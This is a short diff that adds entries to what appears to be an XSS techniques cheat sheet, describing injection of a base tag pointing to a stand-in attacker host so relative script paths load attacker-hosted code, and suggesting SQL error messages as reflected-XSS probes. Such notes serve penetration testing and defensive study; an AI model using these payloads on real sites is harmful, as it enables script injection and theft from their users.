@@ -573,6 +573,18 @@ Injecting malicious content into iframe sources can lead to XSS.
 http://example.com/page.php?page=http://malicious.com
 ```
 
+Injecting Base Tags  
+If script tags and event handler attributes are blogged you can try to leverage base tags for XSS  
+```
+//lets say the site has a script tag like this
+<script src="static/js/context.js"/>
+//the attacker could inject
+<base href="https://attacksite.com">
+//and host their own static/js/context.js. note: the injection point must be above the targetted script
+```
+Exploiting SQL errors  
+if you see SQL errors, they are often not sanitized. This means they are worth checking for reflected xss. This doesn't only apply to SQL specifically but its the context I've seen this most
+
 Exploiting WebAssembly
 WebAssembly (Wasm) code that includes user input can be manipulated to execute malicious scripts.
 ```
